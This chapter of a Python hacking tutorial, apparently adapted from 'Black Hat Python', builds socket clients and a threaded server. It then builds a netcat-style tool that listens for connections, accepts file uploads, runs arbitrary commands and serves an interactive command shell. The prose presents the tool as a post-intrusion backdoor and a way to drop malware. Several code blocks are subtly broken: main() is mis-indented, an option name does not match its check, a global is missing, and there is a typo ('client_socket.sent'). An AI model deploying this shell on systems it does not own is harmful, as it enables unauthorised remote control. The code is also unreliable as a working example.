## Chapter 2: The Network, basics

"The network is and always will be the sexies arena for a hacker."

This chapter will give you some basics on Python networking using the `socket` module. This chapter is the foundation for subsequent chapters in which we will build a host discovery tool, implement cross-platform sniffers, and create a remote trojan framework.

### Socket module

`socket` is the core module for all third-party networked servers and clients tools. This module expose all of the necessary pieces to quickly write TCP and UDP clients and servers, use raw sockets, and so forth.

### TCP Client

Here is a simple TCP client.

<Row>
  <Col>

    <Properties>
      <Property name="AF_INET">
        This parameter is saying we are hoing to use a standard IPv4 address or hostname.
      </Property>
      <Property name="SOCK_STREAM">
        This indicates that this will be a TCP client.
      </Property>
      <Property name="client.connect((target_host, target_port))">
        We connect the client to the server
      </Property>
    </Properties>

  </Col>
  <Col sticky>

```python {{ title: 'Example TCP client in Python 2.7.3' }}
import socket

target_host = "www.google.com"
target_port = 80

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((target_host, target_port))

# send some data
client.send("GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")

# receive some data
response = client.recv(4096)

print response
```

  </Col>
</Row>

This is the simplest form of a TCP client, but the one you will write most often.

In this code snippet, we are making some seious assumptions about sockets:

- The first assumption is that our connection will always succeed.

- The second is that the server is always expecting us to send data first (as opposed to servers that expect to send data to you first and await your response).

- The third assumption is that the server will always send us data back in a timely fashion.

### UDP Client

A python UDP client is not much different than a TCP client; we need make only two small changes to get it to send packets in UDP form.

<Row>
  <Col>

    <Properties>
      <Property name="SOCK_DGRAM">
        Socket use datagram-based protocol
      </Property>
      <Property name="client.sendto(data,(host, port))">
        We pass the data and the server we want send the data because UDP is a connectionless protocol, there is no call to `connect()` beforehand.
      </Property>
      <Property name="client.recvfrom(4096)">
        Called to receive UDP data back, You will also notice that it returns both the data and the details of the remote host and port.
      </Property>
    </Properties>

  </Col>
  <Col sticky>

```python {{ title: 'Example UDP client in Python 2.7.3' }}
import socket

target_host = "www.google.com"
target_port = 80

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# send some data
client.sendto("AABBCC", (target_host, target_port))

# receive some data
data, addr = client.recvfrom(4096)

print data
```

  </Col>
</Row>

We're not looking to be superior network programmers; we want to be quick, easy adn reliable enough to handle our day-to-day hacking tasks.

### TCP Server

You might want to use your own TCP server when writing command shells or crafting a proxy (both of which we'll do later). Let's start by creating a standar multi-threaded TCP server.

```python {{ title: 'Example TCP server' }}

import socket
import threading

bind_ip = "0.0.0.0"
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((bind_ip, bind_port))

server.listen(5)

print "[*] Listening on %s:%d" % (bind_ip, bind_port)

# this is our client-handling thread
def handle_client(client_socket):

  # print out what the client sends
  request = client_socket.recv(1024)

  # print out what the client sends
  print "[*] Received: %s" % request

  # send back a packet
  client_socket.send("ACK!")
  client_socket.close()

while True:
  client, addr = server.accept()

  print "[*] Accepted connection from: %s:%d" % (addr[0], addr[1])

  # spin up our client thread to handle incoming data
  client_handler = threading.Thread(target=handle_client, args=(client,))
  client_handler.start()

```

<Properties>
  <Property name="server.bind((bind_ip, bind_port))">
    We pass the IP address and port we want the server to listen on
  </Property>
  <Property name="server.listen(5)">
    We tell the server to start listening with a maximum backlog of connection
    set to 5
  </Property>
  <Property name="client, addr = server.accept()">
    When a client connects, we receive the client socket into the `client`
    variable, and the remote connection details into the `addr` variable.
  </Property>
  <Property name="threading.Thread(target=handle_client,args=(client,))">
    We then create a new thread object that points to our `handle_client`
    function, and we pass it the client socket object as an argument.
  </Property>
</Properties>

That's it! Pretty simple, but this is a very useful piece of code which we will extend in the next couple of sections when we build a netcat replacement and a TCP proxy.

### Replacing Netcat

Netcat is the utility knife of networking, It's useful to create a simple network client and server that you can use to push files, or to have a listener that gives you command-line access. If you've broken in through a web application, it is definitely worth dropping a Python callback to give you secondary access without having to first burn one of your trojan or backdoors.

so let's get started.

```python {{ title: "Python 2.7.3 "}}
import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen             = False
command            = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0
```

Now let's create our main function responsible for handling command-line argument and calling the rest of our functions.

```python {{ title: "Python 2.7.3"}}

def usage():
  print "Black Hat Python Net tool"
  print "Usage: bhpnet.py -t target_host -p port"
  print "-l --listen                      - listen on [host]:[port] for incoming connections"
  print "-e --execute=file_to_run          - execute the given file upon receiving a connection"
  print "-c --command                     - initialize a command shell"
  print "-u --upload=destination          - upon receiving connection upload a file and write to [destination]"

def main():
  global listen
  global port
  global execute
  global upload_destination
  global target

  if not len(sys.argv[1:]):
    usage()

  # read the commandline options

  try:
    opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                               ["help","listen","execute","target","port","command","upload"])
  except getopt.GetoptError as err:
    print str(err)
    usage()

  for o, a in opts:
    if o in ("-h", "--help"):
      usage()
    elif o in ("-l", "--listen"):
      listen = True
    elif o in ("-c", "--commandshell"):
      command = True
    elif o in ("-u", "--upload"):
      upload_destination = a
    elif o in ("-t", "--target"):
      target = a
    elif o in ("-p", "--port"):
      port = int(a)
    else:
      assert False, "Unhandled Option"

# Are we going to listen or just send data from stdin?

if not listen and len(target) and port > 0:
  # read in the buffer from the commandline
  # this will block, so send CTRL-D IF NOT SENDING INPUT
  # to stdin
  buffer = sys.stdin.read()

  # send data off
  client_sender(buffer)

# we are going to listen and potentially
# upload things, execute commands, and drop a shell back
# depending on our command line options above
if listen:
  server_loop()

main()

```

We begin by reading in all of the command-line options and setting the necessary variables depending on the options we detect. If any of the command-line parameters don't match our criteria we print out useful usage information. In the next block of code, we are trying to mimic netcat to read data from `stdin` and sned it across the network. As noted, if your plan on sending data interactively, you need to send a `CTRL-D` to bypass the stdin read. The final piece is where we detect that we are to set up a listening socket and process further commands (upload a file, execute a command, start a command shell).

Now we starting with our client code. Add the following code above our `main` function.

```python
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # conncect to our target host
        client.connect((target,port))

        if len(buffer):
            client.send(buffer)
        while True:
            # now wait for the data back
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print response,

            # wait for more input
            buffer = raw_input("")
            buffer += "\n"

            # send it off
            client.send(buffer)

    except:

        print "[*] Exception! Exiting."

        # tear down the conncection
        client.close()
```

We start by setting up our TCP socket object and then test to see if we have received any input from stdin. If all is wll, we ship the data off tho the remote target and receive back data until is no more data to receive. We then wait for further input from the user and continue sending and receiving data until the user kills the script. The extra line break is attached specifically to our user input so that our client will be compatible with our command shell.

Now we'll move on and create our primary sever loop and a stub function that will handle both our command execution and our full command shell.

```python
def server_loop():
    global target

    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # send the output back to the client
    return output
```

The `run_command` function, however, contains a new library we haven't covered yet: the `subprocess` library. `subprocess` provides a powerfull process-creation interface that gives you a number of ways to start and interact with client programs. In this case, we're simply running whatever command we pass in, running it on the local operating system, and returning the output from the command back to the client that is connected to us. The exception-handling code will catch generic errors and return back a message letting you know that the command failed.

Now let's implement the logic to do file uploads, command execution, and our shell.

```python
def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    if len(upload_destination):

        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # check for command execution
    if len(execute):

        # run the command
        output = run_command(execute)

        client_socket.send(output)

    # now we got into another loop if a command shell requested

    if command:
        while True:
            # show a simple prompt
            client_socket.sent("<BHP:#>")
                # now we receive until we see a linefeed (enter key)

            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # send back the command output
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)
```

The first chunck of code is responsible for determining whether our network tool is set to receive a file when it received a connection. This can be useful for upload-and-execute exercises or for intalling malware and having the malware remove our Python callback.

First we receive the file data in a loop, To make sure we receive it all, and the we simply open a file handle and write out the conents of the file. The `wb` flag ensures that we are writing the file with binary mode enabled, which ensures that uploading and writing a binary executable will be successful. Next we process our execute functionality, which calls our previously written `run_command` function and simply sends the result back across the network. Our last bit of code handles our command shell; it continues to execute commands as we send them in and sends back the output. You'll notice that it is scanning for a newline character to determine when to process a command, which makes it netcat-friendly.
